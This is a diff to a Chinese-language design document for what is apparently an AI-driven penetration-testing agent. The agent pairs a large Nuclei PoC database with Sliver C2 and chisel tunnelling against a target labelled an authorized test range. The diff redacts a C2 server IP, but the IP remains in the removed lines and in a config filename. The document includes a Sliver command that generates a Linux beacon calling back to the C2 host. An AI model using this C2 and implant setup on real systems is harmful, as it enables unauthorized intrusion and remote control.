@@ -14,7 +14,7 @@
 | 运行环境 | 64 核 Linux 云服务器，`/project/ovogogogo/` |
 | 测试目标 | `zhhovo.top`（授权测试靶场） |
 | PoC 数据库 | 22 万条 Nuclei PoC（pgvector + BGE-M3 嵌入，`/data/poc_db/`） |
-| C2 框架 | Sliver v1.7.3（`/opt/sliver-client_linux`，服务器 `148.135.88.219`） |
+| C2 框架 | Sliver v1.7.3（`/opt/sliver-client_linux`，测试服务器 ``） |
 | 内网穿透 | chisel（`/usr/local/bin/chisel`）+ proxychains |
 
 ---
@@ -169,7 +169,7 @@ if (tokenCount > COMPACT_THRESHOLD) {
               │  PostgreSQL+pgvector        │
               │  22万条 Nuclei PoC          │
               │  BGE-M3 嵌入模型            │
-              │  Sliver C2 (148.135.88.219) │
+              │  Sliver C2 () │
               │  chisel + proxychains       │
               └────────────────────────────┘
 ```
@@ -330,13 +330,13 @@ WeaponRadar({queries: ["Apache Log4j RCE", "Shiro 反序列化", "Jenkins RCE"]}
 |------|------|
 | 客户端 | `/opt/sliver-client_linux` |
 | 配置文件 | `/root/.sliver-client/configs/ningbo-ai-v2_148.135.88.219.cfg` |
-| C2 服务器 | `148.135.88.219:31337` |
+| C2 服务器 | `` |
 | 版本 | v1.7.3 |
 | 调用方式 | RC 脚本非交互模式 `/opt/sliver-client_linux --rc /tmp/script.rc` |
 
 ```bash
 # 生成 Linux Beacon
-generate beacon --http http://148.135.88.219:80 --os linux --arch amd64 --save /tmp/
+generate beacon --http http://:80 --os linux --arch amd64 --save /tmp/
 
 # 查看上线会话
 sessions
